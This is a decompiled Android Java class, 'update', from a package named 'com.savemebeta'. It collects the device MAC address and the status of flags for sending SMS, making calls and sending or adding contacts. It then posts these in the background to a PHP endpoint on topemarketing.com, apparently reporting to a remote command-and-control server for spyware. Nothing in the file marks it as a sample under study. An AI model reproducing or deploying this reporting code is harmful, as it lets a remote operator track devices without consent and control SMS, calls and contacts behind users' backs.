package com.savemebeta;

import android.os.AsyncTask;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class update {
    public static String Add_Contact;
    public static String Mac;
    public static String Make_Call;
    public static String SendTime;
    public static String Send_Contact;
    public static String Send_ESms;
    public static String Send_Sms;
    public static String Still_Here;
    public static String Timea;

    public class sendmystatus extends AsyncTask<Void, Void, Void> {
        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(Void... params) {
            HttpClient httpClient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost("http://topemarketing.com/android/googlefinal/updatestatus.php");
            List<NameValuePair> nameValuePairs = new ArrayList();
            nameValuePairs.add(new BasicNameValuePair("mac", update.Mac));
            nameValuePairs.add(new BasicNameValuePair("sendsms", update.Send_Sms));
            nameValuePairs.add(new BasicNameValuePair("sendesms", update.Send_ESms));
            nameValuePairs.add(new BasicNameValuePair("makecall", update.Make_Call));
            nameValuePairs.add(new BasicNameValuePair("sendcontact", update.Send_Contact));
            nameValuePairs.add(new BasicNameValuePair("addcontact", update.Add_Contact));
            nameValuePairs.add(new BasicNameValuePair("timea", update.Timea));
            nameValuePairs.add(new BasicNameValuePair("checkif", "yes"));
            try {
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            try {
                httpClient.execute(httpPost);
            } catch (ClientProtocolException e2) {
                e2.printStackTrace();
            } catch (IOException e3) {
                e3.printStackTrace();
            }
            return null;
        }
    }

    public void var(String upmac, String upsms, String upesms, String upcall, String upcontact, String upacontact, String uptime, String upcheck) {
        SendTime = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(Calendar.getInstance().getTime());
        Mac = upmac;
        Send_Sms = upsms;
        Send_ESms = upesms;
        Make_Call = upcall;
        Send_Contact = upcontact;
        Add_Contact = upacontact;
        Timea = SendTime;
        Still_Here = upcheck;
        new sendmystatus().execute(new Void[0]);
    }
}
